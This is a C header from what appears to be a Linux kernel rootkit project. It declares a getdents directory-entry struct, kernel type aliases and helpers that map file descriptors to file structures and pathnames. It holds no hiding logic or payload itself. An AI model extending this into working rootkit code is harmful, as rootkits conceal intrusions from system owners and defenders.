#ifndef _ROOTKIT_FILES_H_
#define _ROOTKIT_FILES_H_

#include <linux/types.h>
// types.h is required for dirent.h, so we include it first
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/path.h>

/**
 * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
 * This is used to parse the output of the `getdents` syscall.
 */
typedef struct linux_dirent {
    unsigned long d_ino;     // Inode number
    unsigned long d_off;     // Offset to next linux_dirent
    unsigned short d_reclen; // Length of this linux_dirent
    char d_name[];           // Filename (null-terminated)
} dirent_t;

typedef struct linux_dirent64 dirent64_t;

typedef struct file file_t;
typedef struct path path_t;
typedef struct inode inode_t;
typedef struct files_struct files_t;

/**
 * Gets the file structure associated with the given file descriptor.
 *
 * @param d_fd The file descriptor
 * @return The file structure associated with the given file descriptor
 */
const file_t *fd_get_file(const int d_fd);

/**
 * Gets the pathname of the file associated with the given file descriptor.
 * The returned string must be freed with `kfree`/`kvfree`.
 *
 * @param d_fd The file descriptor
 * @return The pathname of the file associated with the given file descriptor
 */
const char *fd_get_pathname(const int d_fd);

#endif
